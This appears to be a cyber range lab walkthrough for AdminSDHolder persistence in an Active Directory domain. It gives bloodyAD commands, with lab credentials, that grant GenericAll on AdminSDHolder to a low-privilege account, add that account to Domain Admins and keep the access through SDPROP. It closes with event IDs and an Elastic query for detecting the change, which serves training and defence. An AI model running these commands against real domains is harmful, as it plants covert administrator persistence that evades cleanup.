# WT#025 — AdminSDHolder Persistence

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | chief_command / C0mm@nd_Ch1ef! (Post-DA) |
| **Tools Required** | bloodyAD, ADSI Edit (dsa.msc) |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1098, T1505 |
| **Difficulty** | Hard |

## Prerequisites
- DA-level access (chief_command or equivalent) to modify AdminSDHolder
- Understanding that SDPROP runs every 60 minutes and overwrites ACLs on protected groups

## Attack Steps

### Step 1 — Verify current AdminSDHolder ACL
```bash
# From kali, as DA (chief_command), examine the AdminSDHolder object
bloodyAD --host dc01.cadre.local -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' get aces 'CN=AdminSDHolder,CN=System,DC=cadre,DC=local'
```

### Step 2 — Grant GenericAll to a low-priv persistence user
```bash
# Grant GenericAll on AdminSDHolder to analyst_dfir
# This means analyst_dfir will be added to protected groups AND
# the AdminSDHolder ACL gives analyst_dfir permanent control over all protected objects

bloodyAD --host dc01.cadre.local -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' add genericall 'CN=AdminSDHolder,CN=System,DC=cadre,DC=local' 'CN=analyst_dfir,OU=DFIR,DC=cadre,DC=local'
```

### Step 3 — Add analyst_dfir to a protected group
```bash
# Add analyst_dfir to Domain Admins (protected group)
bloodyAD --host dc01.cadre.local -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' add groupmember 'CN=Domain Admins,CN=Users,DC=cadre,DC=local' 'CN=analyst_dfir,OU=DFIR,DC=cadre,DC=local'
```

### Step 4 — Wait for SDPROP propagation (or trigger manually)
```bash
# SDPROP runs automatically every 60 minutes on the PDC emulator
# To trigger manually from dc01:
Invoke-ADDCAdminSDHolderProtection -TriggerSdprop -ErrorAction SilentlyContinue

# Or restart the SDPROP service:
# On dc01, run as DA:
powershell -c "Restart-Service -Name 'NTDS' -Force"  # NOT recommended in production

# After SDPROP runs, verify that the ACL persists even if removed:
# adminSDHolder is re-applied every cycle

# Verify the persistence after SDPROP
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' get aces 'CN=AdminSDHolder,CN=System,DC=cadre,DC=local'

# analyst_dfir retains control even if removed from Domain Admins
```

### Step 5 — Cleanup bypass verification
```bash
# Even if an admin removes analyst_dfir from Domain Admins,
# the AdminSDHolder ACL we set will re-add the GenericAll right
# within 60 minutes

# Demonstrate: Remove analyst_dfir from Domain Admins
bloodyAD --host dc01.cadre.local -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' remove groupmember 'CN=Domain Admins,CN=Users,DC=cadre,DC=local' 'CN=analyst_dfir,OU=DFIR,DC=cadre,DC=local'

# Wait 60 min for SDPROP — analyst_dfir can still control Domain Admins
# via the AdminSDHolder GenericAll delegation
```

## Post-Exploitation Chain
WT#025 is itself the persistence mechanism. After this:
- analyst_dfir retains GenericAll on all protected groups permanently
- Survives Domain Admins removal
- Can re-add self to Domain Admins at any time via AdminSDHolder GenericAll
- Persists across DC reboots and most incident response cleaning

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 5136: Directory service object modification on CN=AdminSDHolder,CN=System
  - Event ID 4728: Member added to security-enabled global group (analyst_dfir → Domain Admins)
  - Event ID 4738: User account modified
  - Event ID 4624: Logon as analyst_dfir with admin privileges
  - Sysmon EID 1: bloodyAD.exe, PowerShell.exe
- **Detection difficulty:** AdminSDHolder modifications are rare in normal operations. Baseline what normal AdminSDHolder ACLs look like and alert on ANY modification. Event ID 5136 with ObjectDN containing `AdminSDHolder` is the key detection signal.
- **Elastic saved search:** `event.code:5136 AND winlog.event_data.ObjectDN:(*AdminSDHolder*)`

## Status
POST-EXPLOIT
